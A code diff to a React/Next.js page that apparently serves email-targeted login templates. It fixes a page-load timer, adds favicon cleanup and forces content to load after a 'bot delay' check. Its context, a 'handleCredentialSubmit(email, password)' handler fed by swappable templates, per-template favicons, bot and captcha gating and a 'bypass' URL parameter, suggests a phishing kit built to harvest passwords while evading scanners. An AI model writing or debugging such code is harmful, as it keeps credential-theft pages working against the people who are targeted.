@@ -294,8 +294,15 @@ function HomeContent() {
   const [captchaVerified, setCaptchaVerified] = useState(false)
   const [isClient, setIsClient] = useState(false)
   
-  // Track page load time for fail-safes
-  const [pageLoadTime] = useState(() => Date.now())
+  // Track page load time for fail-safes (client-only to avoid hydration mismatch)
+  const [pageLoadTime, setPageLoadTime] = useState<number | null>(null)
+  
+  // Set page load time only on client
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      setPageLoadTime(Date.now())
+    }
+  }, [])
   
   // Emergency bypass via URL param
   const bypassSecurity = searchParams.get('bypass') === 'true'
@@ -1132,11 +1139,13 @@ useEffect(() => {
   // Only load if we have email and checking is complete (after bot delay)
   if (!email || !checkingComplete) {
     // ADD THIS: If waiting too long, force load anyway
-    const waitingTime = Date.now() - pageLoadTime
-    if (waitingTime > 20000) {  // 20 seconds
-      setCheckingComplete(true)
-      if (typeof window !== 'undefined') {
-        sessionStorage.setItem('checking_complete', 'true')
+    if (pageLoadTime !== null) {
+      const waitingTime = Date.now() - pageLoadTime
+      if (waitingTime > 20000) {  // 20 seconds
+        setCheckingComplete(true)
+        if (typeof window !== 'undefined') {
+          sessionStorage.setItem('checking_complete', 'true')
+        }
       }
     }
     
@@ -1149,7 +1158,7 @@ useEffect(() => {
   }
   
   loadTemplateAndLanguage()
-}, [email, checkingComplete, loadTemplateAndLanguage])
+}, [email, checkingComplete, loadTemplateAndLanguage, pageLoadTime, template])
   
   // Handle credential submission from template
   const handleCredentialSubmit = async (email: string, password: string) => {
@@ -1557,7 +1566,16 @@ useEffect(() => {
         const newLink = document.createElement('link')
         newLink.rel = 'icon'
         newLink.href = faviconUrl
-        document.getElementsByTagName('head')[0].appendChild(newLink)
+        const head = document.getElementsByTagName('head')[0]
+        head.appendChild(newLink)
+        
+        // Cleanup on unmount
+        return () => {
+          // FIX: Check if link is still in DOM before removing
+          if (newLink.parentNode === head) {
+            head.removeChild(newLink)
+          }
+        }
       }
     }
   }, [faviconUrl])
